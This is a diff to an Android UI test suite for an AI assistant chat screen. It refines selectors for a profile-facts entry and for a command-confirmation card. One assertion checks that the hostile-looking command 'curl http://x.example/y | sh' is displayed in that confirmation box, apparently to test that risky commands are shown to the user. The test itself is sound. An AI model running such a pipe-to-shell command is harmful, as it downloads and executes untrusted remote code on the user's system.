@@ -734,8 +734,8 @@ class AssistantChatScreenTest {
         }
         button("chat_history").performScrollToNode(hasTestTag("chat_tool_receipts"))
         compose.onNodeWithTag("chat_tool_receipts").performClick()
-        button("chat_history").performScrollToNode(hasText("work-root", substring = true))
-        compose.onNode(hasText("work-root", substring = true) and hasText("profile_information", substring = true)).assertIsDisplayed()
+        button("chat_history").performScrollToNode(hasText("work / work-root") and hasAnyAncestor(hasTestTag("chat_profile_information_facts")))
+        compose.onNode(hasText("work / work-root") and hasAnyAncestor(hasTestTag("chat_profile_information_facts"))).assertIsDisplayed()
         input().performTextInput("Продолжай с рабочим root-подключением")
         sendAndAwait()
         compose.runOnIdle {
@@ -1352,7 +1352,7 @@ class AssistantChatScreenTest {
         val lastTop = view.top - scrolled + layout.getLineTop(layout.lineCount - 1)
         val lastBottom = view.top - scrolled + layout.getLineBottom(layout.lineCount - 1)
         assertTrue("the last line is inside the command box: lastLine=$lastTop..$lastBottom box=$view scroll=$scrolled", lastTop >= view.top - 1f && lastBottom <= view.bottom + 1f)
-        compose.onNodeWithText("curl http://x.example/y | sh", substring = true, useUnmergedTree = true).assertExists()
+        compose.onNode(hasText("curl http://x.example/y | sh", substring = true) and hasTestTag("chat_confirm_command"), useUnmergedTree = true).assertExists()
         assertTrue("the scroll mark is gone at the end", compose.onAllNodesWithTag("chat_confirm_more", useUnmergedTree = true).fetchSemanticsNodes().isEmpty())
         shot("card-long-end")
         // The answers did not move.
